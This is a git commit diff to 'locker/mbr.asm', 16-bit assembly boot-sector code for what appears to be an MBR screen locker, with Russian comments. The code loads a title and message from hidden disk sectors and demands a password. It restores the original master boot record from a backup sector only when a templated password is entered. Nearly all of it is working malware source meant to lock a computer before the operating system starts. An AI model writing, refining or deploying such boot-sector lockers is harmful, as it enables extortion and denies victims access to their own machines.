d2126801a9c71c059596e6e12052cd07086d1be4
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-08-14 09:34:03 +0300

    mbr.asm

--- locker/mbr.asm
+++ locker/mbr.asm
@@ -1,221 +1,251 @@
 BITS 16
 ORG 0x7C00
+
 start:
-cli
-cld
-xor ax,ax
-mov ds,ax
-mov es,ax
-mov ss,ax
-mov sp,0x7C00
-sti
-mov ax,0x0003
-int 0x10
-mov ah,0x06
-mov al,0
-mov bh,0x07
-mov cx,0
-mov dx,0x184F
-int 0x10
-mov ax,0x0000
-mov es,ax
-mov bx,0x1000
-mov ah,0x02
-mov al,8
-mov ch,0
-mov cl,3
-mov dh,0
-mov dl,0x80
-int 0x13
-jc load_error
-mov ax,0x1100
-mov bx,0x1000
-mov cx,256
-mov dx,0
-push ax
-mov ax,0x0000
-mov es,ax
-mov bp,0x1000
-pop ax
-int 0x10
-mov ax,0x0000
-mov es,ax
-mov bx,0x9000
-mov ah,0x02
-mov al,1
-mov ch,0
-mov cl,11
-mov dh,0
-mov dl,0x80
-int 0x13
-jc load_error
-mov si,0x9000
-call print
-mov ax,0x0000
-mov es,ax
-mov bx,0x9200
-mov ah,0x02
-mov al,1
-mov ch,0
-mov cl,12
-mov dh,0
-mov dl,0x80
-int 0x13
-jc load_error
-mov si,0x9200
-call print
-mov ah,0x02
-mov bh,0
-mov dh,24
-mov dl,0
-int 0x10
-mov si,msg_prompt
-call print
+    cli
+    cld
+    xor ax, ax
+    mov ds, ax
+    mov es, ax
+    mov ss, ax
+    mov sp, 0x7C00
+    sti
+
+    ; Установка видеорежима
+    mov ax, 0x0003
+    int 0x10
+
+    ; Очистка экрана (фон)
+    mov ah, 0x06
+    mov al, 0
+    mov bh, 0x00
+    mov cx, 0
+    mov dx, 0x184F
+    int 0x10
+
+    ; Загрузка шрифта (сектора 3-10)
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x1000
+    mov ah, 0x02
+    mov al, 8
+    mov ch, 0
+    mov cl, 3
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    ; Загрузка шрифта в BIOS
+    mov ax, 0x1100
+    mov bx, 0x0100
+    int 0x10
+
+    ; Загрузка заголовка (сектор 11)
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x9000
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 11
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    mov si, 0x9000
+    call print
+
+    ; Загрузка текста (сектор 12)
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x9200
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 12
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc load_error
+
+    mov si, 0x9200
+    call print
+
+    ; Курсор вниз и вывод Password (только 1 раз!)
+    mov ah, 0x02
+    mov bh, 0
+    mov dh, 24
+    mov dl, 0
+    int 0x10
+
+    mov si, msg_prompt
+    call print
+
 password_loop:
-mov di,buffer
-mov cx,24
-xor al,al
-rep stosb
-call get_password
-call check_password
-cmp byte[password_ok],1
-je restore_and_boot
-mov si,msg_wrong
-call print
-jmp password_loop
+    call get_password
+    call check_password
+    cmp byte [password_ok], 1
+    je restore_and_boot
+    
+    ; Выводим Wrong password! (курсор не двигаем)
+    mov si, msg_wrong
+    call print
+    
+    ; Возвращаем курсор на строку с Password:
+    mov ah, 0x02
+    mov bh, 0
+    mov dh, 24
+    mov dl, 9          ; Длина "Password: " = 9 символов
+    int 0x10
+
+    jmp password_loop
+
 load_error:
-mov si,msg_error
-call print
-jmp hang
+    mov si, msg_error
+    call print
+    jmp hang
+
 restore_and_boot:
-call restore_mbr
-jmp load_os
+    call restore_mbr
+    jmp load_os
+
 restore_mbr:
-pusha
-mov ax,0x0000
-mov es,ax
-mov bx,0x7E00
-mov ah,0x02
-mov al,1
-mov ch,0
-mov cl,2
-mov dh,0
-mov dl,0x80
-int 0x13
-jc .error
-mov ax,0x0000
-mov es,ax
-mov bx,0x7E00
-mov ah,0x03
-mov al,1
-mov ch,0
-mov cl,1
-mov dh,0
-mov dl,0x80
-int 0x13
+    pusha
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 2
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc .error
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x03
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
 .error:
-popa
-ret
+    popa
+    ret
+
 load_os:
-cli
-mov sp,0x6000
-sti
-mov ax,0x0000
-mov es,ax
-mov bx,0x7C00
-mov ah,0x02
-mov al,1
-mov ch,0
-mov cl,1
-mov dh,0
-mov dl,0x80
-int 0x13
-jc load_error
-jmp 0x0000:0x7C00
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jmp 0x0000:0x7C00
+
 print:
-lodsb
-or al,al
-jz .done
-mov ah,0x0E
-mov bh,0
-mov bl,0x07
-int 0x10
-jmp print
+    lodsb
+    or al, al
+    jz .done
+    mov ah, 0x0E
+    mov bh, 0x00
+    mov bl, 0x07
+    int 0x10
+    jmp print
 .done:
-ret
+    ret
+
 get_password:
-mov di,buffer
-mov cx,24
+    mov di, buffer
+    mov cx, 64
 .loop:
-xor ax,ax
-int 0x16
-cmp al,0x0D
-je .done
-cmp al,0x08
-je .backspace
-cmp al,0x7F
-je .backspace
-cmp di,buffer+24
-je .loop
-stosb
-mov ah,0x0E
-mov bh,0
-mov bl,0x07
-mov al,[di-1]
-int 0x10
-jmp .loop
+    xor ax, ax
+    int 0x16
+    cmp al, 0x0D
+    je .done
+    cmp al, 0x08
+    je .backspace
+    cmp al, 0x7F
+    je .backspace
+    cmp di, buffer + 64
+    je .loop
+    stosb
+    mov ah, 0x0E
+    mov bh, 0x00
+    mov bl, 0x07
+    mov al, [di - 1]
+    int 0x10
+    jmp .loop
 .backspace:
-cmp di,buffer
-je .loop
-dec di
-mov byte[di],0
-mov ah,0x0E
-mov bh,0
-mov bl,0x07
-mov al,0x08
-int 0x10
-mov al,' '
-int 0x10
-mov al,0x08
-int 0x10
-jmp .loop
+    cmp di, buffer
+    je .loop
+    dec di
+    mov ah, 0x0E
+    mov bh, 0x00
+    mov bl, 0x07
+    mov al, 0x08
+    int 0x10
+    mov al, ' '
+    int 0x10
+    mov al, 0x08
+    int 0x10
+    jmp .loop
 .done:
-mov byte[di],0
-mov ah,0x0E
-mov bh,0
-mov bl,0x07
-mov al,0x0A
-int 0x10
-mov al,0x0D
-int 0x10
-ret
+    mov byte [di], 0
+    mov ah, 0x0E
+    mov bh, 0x00
+    mov bl, 0x07
+    mov al, 0x0A
+    int 0x10
+    mov al, 0x0D
+    int 0x10
+    ret
+
 check_password:
-mov si,buffer
-mov di,password
+    mov si, buffer
+    mov di, password
 .compare:
-lodsb
-mov bl,[di]
-cmp al,bl
-jne .fail
-inc di
-or al,al
-jz .success
-jmp .compare
+    lodsb
+    or al, al
+    jz .check_end
+    cmpsb
+    jne .fail
+    jmp .compare
+.check_end:
+    cmp byte [di], 0
+    jne .fail
+    mov byte [password_ok], 1
 .fail:
-mov byte[password_ok],0
-ret
-.success:
-mov byte[password_ok],1
-ret
+    ret
+
 hang:
-cli
-hlt
-jmp hang
-msg_prompt: db 'Password: ',0
-msg_wrong: db 13,10,'Wrong password!',13,10,0
-msg_error: db 'Load error!',0
-password: db {PASSWORD_HEX}
-buffer: times 24 db 0
-password_ok: db 0
+    cli
+    hlt
+    jmp hang
+
+msg_prompt:
+    db 'Password: ',0
+msg_wrong:
+    db 13,10,'Wrong password!',13,10,0
+msg_error:
+    db 'Load error!',0
+
+password:
+    db {PASSWORD_HEX}
+
+buffer:
+    times 64 db 0
+password_ok:
+    db 0
+
 times 510 - ($ - $$) db 0
 dw 0xAA55
